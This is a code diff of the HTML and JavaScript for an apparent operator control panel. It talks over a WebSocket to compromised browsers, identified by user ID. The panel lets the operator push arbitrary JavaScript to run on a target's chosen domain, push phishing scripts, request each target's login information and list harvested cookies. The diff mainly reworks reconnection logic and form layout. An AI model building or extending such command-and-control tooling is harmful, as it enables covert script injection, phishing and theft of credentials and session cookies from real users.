@@ -11,23 +11,22 @@
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 		<script>
 			var HOST = location.origin.replace(/^http/, 'ws');
-            var serverID = "0";
-
-var ws;
-var sites;
+			var serverID = "0";
+var ws = new WebSocket(HOST);  
+var sites = new Array();
 
 function resetSocket(){//fix for reseting sockets
     console.log("reseting socket");
     ws= new WebSocket(HOST);
-    sites = new Array();
-
-ws.onclose = function(e){
-    console.log("reseting socket");
-    setTimeout(function() {resetSocket();}, 1000);
+    ws.onclose = function(){
+        setTimeout(resetSocket, 1000);
+    };
+}
+ws.onclose = function(){
+    setTimeout(resetSocket, 1000);
 };
 
 ws.onopen = function(event){
-    document.getElementById("blacklist").innerHTML = "";
     var jsonPackage ={type:'getList', id:'0'};
     ws.send(JSON.stringify(jsonPackage));
     console.log("Request sent");
@@ -43,11 +42,9 @@ ws.onmessage = function(e){
     object = JSON.parse(e.data);
     switch(object.type){
         case 'blackList':
-        if (object.id=='0'){
             sites = object.allSites;
             console.log(object.allSites);
             console.log("got something");
-            document.getElementById("blacklist").innerHTML = "";
             sites.forEach(site => {
                 if(site != "" && site != null){
                     node = document.getElementById("blacklist");
@@ -58,15 +55,9 @@ ws.onmessage = function(e){
                     aRow.appendChild(aCol);
                 }
             });
-            break;}
+            break;
         case 'statusList':
-        if (object.id=='0'){
             console.log("got a status");
-            cards=document.getElementsByClassName("card");
-            var cardNum=cards.length;
-            for(var i=1; i<cardNum; i++) {
-                cards[1].remove();
-            }
             var ids = new Array();
             ids = object.ids;
             var statuses = object.status;
@@ -79,7 +70,7 @@ ws.onmessage = function(e){
                 var jsonPackage = {type:'getLoginInfo', id:'0', targetID:ids[i]};
                 ws.send(JSON.stringify(jsonPackage));
             }
-            break;}
+            break;
         case 'idHistory':
             var histArr = new Array();
             histArr = object.history;
@@ -105,8 +96,6 @@ ws.onmessage = function(e){
             break;
     }    
 }
-}
-resetSocket();
 
 window.addEventListener("hashchange", function() { scrollBy(0, -70) });
 
@@ -116,6 +105,7 @@ function js(){
     var url = document.getElementById("JS_URL").value;
     var jsonPackage = {id:"0", targetID: id, type:"sendJavascript", script:script, domain:url};
     ws.send(JSON.stringify(jsonPackage));
+    //alert("SENT");
 }
 
 function phish(){
@@ -123,6 +113,7 @@ function phish(){
     var url = document.getElementById("Phishing_URL").value;
     var jsonPackage = {id:"0", targetID: id, type:"sendPhishingscript", domain:url};
     ws.send(JSON.stringify(jsonPackage));
+    console.log("SENT");
 }
 
 function send() {
@@ -578,27 +569,27 @@ function fillCookies(id, nameArray, domainArray, valueArray){
         <div class="col-12">
             <div class="row padding">  
                 <!-- Phishing and JSexe -->
-                <div class="col-6">
+                <div class="col-6" id="scriptSection">
                     <!-- Add Javascript -->
-                    <form name="jsForm" onsubmit="js()">
+                    <!-- <form name="jsForm" onsubmit "return js()"> -->
                         <h4>Add javascript execution script:</h4>
                         <br>
                         <input type = "text" class="form-control" id = "JS_ID" placeholder = "User ID">
                         <input type = "text" class="form-control" id = "JS_Script" placeholder = "Script">
                         <input type = "text" class="form-control" id = "JS_URL" placeholder = "URL">
-                        <input type = "submit" id = "Submit_JS_Script" class="btn btn-outline-secondary">
-                    </form>
+                        <input type = "submit" id = "Submit_JS_Script" class="btn btn-primary" onclick="js()">
+                    <!-- </form> -->
                 </div>
                 <div class="col-6">
                     <!-- Add Phishing -->
-                    <form name="phishingForm" onsubmit="phish()">
+                    <!-- <form name="phishingForm" onsubmit "return phish()"> -->
                         <h4>Add phishing script:</h4>
                         <br>
                         <input type = "text" class="form-control" id = "Phishing_ID" placeholder = "User ID">
                         <!-- <input type = "text" name = "Phishing_Script" placeholder = "Script"><br> -->
                         <input type = "text" class="form-control" id = "Phishing_URL" placeholder = "URL">
-                        <input type = "submit" id = "Submit_Phishing_Script" class="btn btn-outline-secondary">
-                    </form>
+                        <input type = "submit" id = "Submit_Phishing_Script" class="btn btn-primary" onclick="phish()">
+                    <!-- </form> -->
                 </div>
             </div>
         </div>
@@ -614,28 +605,26 @@ function fillCookies(id, nameArray, domainArray, valueArray){
 
     <!-- Adding Blacklisted Site -->
 
-    <div class="col-6">
+    <br>
 
-        <h4>Blacklisted Sites</h4>
-        <ul class = "list-group" id="blacklist"></ul>
+    <h4>Blacklisted Sites</h4>
+    <ul class = "list-group" id="blacklist"></ul>
 
-        <br><br>
+    <br><br>
 
-        <h4>Add site to blacklist:</h4>
-        <form onsubmit="blacklist()">
-            <input type = "text" class="form-control" id="blacklistEntry" placeholder="URL">
-            <input type = "submit" class="btn btn-outline-secondary">
-        </form>
+    <h4>Add site to blacklist:</h4>
+    <form onsubmit="blacklist()">
+        <input type = "text" id="blacklistEntry" placeholder="URL"><br>
+        <input type = "submit" class="btn btn-primary">
+    </form>
 
-    </div>
-
-   <br><br><br>
+   <br><br><br><br><br><br><br><br>
 
     
 	</div>
   </div>
 
-  <!-- <br><br>
+  <br><br>
   <button onclick="getElementById('p1').innerHTML = ''">Clear log</button>
   <form onsubmit="send();return false;">
     ID: <input type="text" id="id"><br>
@@ -645,7 +634,7 @@ function fillCookies(id, nameArray, domainArray, valueArray){
     <input type="text" id="dataType3">: <input type="text" id="data3"><br>
     <input type="submit" value="Submit">
   </form>
-  <p id="p1">Recieved data will show here:</p> -->
+  <p id="p1">Recieved data will show here:</p>
 
 
   </body>
